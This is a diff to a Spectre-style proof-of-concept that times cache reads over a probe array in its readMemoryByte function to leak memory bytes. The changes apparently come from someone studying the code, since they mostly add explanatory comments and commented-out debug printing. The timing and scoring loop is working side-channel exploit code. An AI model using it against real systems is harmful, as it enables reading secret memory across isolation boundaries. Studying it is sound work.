@@ -89,17 +89,27 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2],
     // ************************************************************
     
     /* Time reads. Mixed-up order to prevent stride prediction */
+    // read everything in the probeArray (size 256 * 512)
+    //printf("newset\n");
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
+      //printf("Checking index: %d\n",mix_i);
       addr = &probeArray[mix_i * 512];
+
+      // read and time
       time1 = __rdtscp(&junk);
       junk = *addr; /* Time memory access */
       time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
-      if (time2 <= CACHE_HIT_THRESHOLD &&
-          mix_i != array1[tries % array1_size])
+      // end read and time
+
+      // delta indicates cache hit
+      // &&
+      // mix_i [0,256) != array1[ [0,999) mod 16 ]
+      // ^ what does this mean? The 
+      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit -> score +1 for this value */
-      // results is an array of 256 (static int)
     }
+
 
     /* Locate highest & second-highest results */
     j = k = -1;
@@ -111,10 +121,18 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2],
         k = i;
       }
     }
+
     if (results[j] >= (2 * results[k] + 5) ||
         (results[j] == 2 && results[k] == 0))
       break; /* Success if best is > 2*runner-up + 5 or 2/0) */
   }
+
+  // whats in results? should be results of 1000 trials
+//  printf("Trial Results:\n");
+//  for (i = 0; i < 256; i++) {
+//    printf("res %c: %d\n",i,results[i]);
+//  }
+
   /* use junk to prevent code from being optimized out */
   results[0] ^= junk;
   value[0] = (uint8_t)j;
